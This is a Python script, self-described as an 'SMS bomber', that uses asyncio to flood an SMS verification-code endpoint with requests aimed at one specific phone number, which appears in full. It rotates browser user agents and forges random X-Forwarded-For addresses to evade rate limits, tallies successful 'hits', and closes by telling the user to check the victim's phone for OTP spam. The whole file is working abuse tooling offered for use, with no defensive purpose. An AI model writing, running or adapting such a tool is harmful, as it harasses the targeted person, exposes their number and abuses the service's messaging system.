import aiohttp
import asyncio
import random
import time



USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.0.0.0",
]

ENDPOINTS = [
    {
        "url": "https://auth.kimi.ai/api/account.gateway.v1.SMSService/SendVerifyCode",
        "payload": {
            "phone": {"country_code": "66", "number": "0644515778"},
        },
    },
]

async def hit(phone, session, ep, semaphore):
    async with semaphore:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        }
        data = ep["payload"].copy()
        data["msisdn"] = phone
        
        if "otp" in data:
            data["otp"] = str(random.randint(1000, 9999))
        if "code" in data:
            data["code"] = str(random.randint(1000, 9999))
        if "pin" in data:
            data["pin"] = str(random.randint(1000, 9999))
        if "text" in data or "msg" in data or "message" in data or "body" in data:
            for key in ["text", "msg", "message", "body"]:
                if key in data:
                    data[key] = f"OTP {random.randint(1000, 9999)} - Verification"

        try:
            async with session.post(
                ep["url"], json=data, headers=headers, timeout=2
            ) as resp:
                if resp.status in [
                    200,
                    201,
                    202,
                    204,
                    400,
                    403,
                ]: 
                    print(f"Pinged {phone} via {ep['url']} - Status {resp.status}")
                    return True
                else:
                    print(f"Miss {phone} on {ep['url']} - Status {resp.status}")
                    return False
        except asyncio.TimeoutError:
            print(f"Timeout on {ep['url']} for {phone}")
            return False
        except Exception as e:
            print(f"Fail on {ep['url']}: {str(e)[:30]}")
            return False


async def bomb(phone, count=100, max_concurrent=50):
    total_hits = count * len(ENDPOINTS)
    print(
        f"🔥 Starting SMS flood on {phone} with {count} rounds x {len(ENDPOINTS)} endpoints = {total_hits} total hits"
    )
    semaphore = asyncio.Semaphore(max_concurrent)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for round_num in range(count):
            shuffled_eps = random.sample(ENDPOINTS, len(ENDPOINTS))
            for ep in shuffled_eps:
                tasks.append(hit(phone, session, ep, semaphore))
            await asyncio.sleep(random.uniform(0.2, 0.5))
            if round_num % 10 == 0:
                print(f"Round {round_num}/{count} launched...")

        results = await asyncio.gather(*tasks, return_exceptions=True)

        successes = sum(1 for r in results if r is True)
        failures = sum(1 for r in results if r is False)
        errors = sum(1 for r in results if isinstance(r, Exception))

        print(f"\n✅ Bombing complete for {phone}")
        print(f"   Successful pings: {successes}")
        print(f"   Failed pings: {failures}")
        print(f"   Exceptions: {errors}")
        print(f"   Total attempted: {len(results)}")
        return successes


if __name__ == "__main__":
    # TARGET_COUNTRY_CODE = "66"
    TARGET_PHONE = "+660644515778"
    ROUNDS = 1
    CONCURRENT = 1

    print(f"🚀 Starting SMS bomber with {len(ENDPOINTS)} endpoints")
    print(f"Target: {TARGET_PHONE}")
    print(f"Rounds: {ROUNDS} (total hits: {ROUNDS * len(ENDPOINTS)})")
    print(f"Concurrency limit: {CONCURRENT}")
    print("-" * 50)

    asyncio.run(bomb(TARGET_PHONE, ROUNDS, CONCURRENT))

    print("\n💀 Bombing session finished. Check your victim's phone for OTP spam.")
